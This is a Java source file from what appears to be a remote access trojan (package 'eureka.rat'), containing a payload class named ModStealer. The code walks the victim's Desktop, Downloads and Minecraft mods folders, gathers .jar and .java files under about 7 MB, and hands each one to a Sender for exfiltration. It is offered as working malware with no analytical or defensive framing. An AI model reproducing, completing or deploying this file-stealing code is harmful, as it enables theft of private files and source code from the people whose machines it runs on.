package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Objects;

public final class ModStealer implements Payload {
    public void execute() throws Exception {
        String[] directories = new String[]{"\\Desktop", "\\Downloads", "\\AppData\\Roaming\\.minecraft\\mods"};

        for (String directory : directories) {
            Files.walk(Paths.get(System.getProperty("user.home") + directory))
                    .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + directory))
                    .forEach(path -> {
                        // Directory?
                        if (path.toFile().isDirectory()) {
                            Arrays.stream(Objects.requireNonNull(path.toFile().listFiles())).forEach(file -> {
                                if (file.getName().endsWith(".jar") || file.getName().endsWith(".java")) {
                                    if (size(path) < 7000000L) {
                                        Sender.send(file);
                                    }
                                }
                            });
                        }

                        // Is Jar or Java file in current directory?
                        if (path.toFile().getName().endsWith(".jar") || path.toFile().getName().endsWith(".java")) {
                            if (size(path) < 7000000L) {
                                Sender.send(path.toFile());
                            }
                        }
                    });
        }
    }
}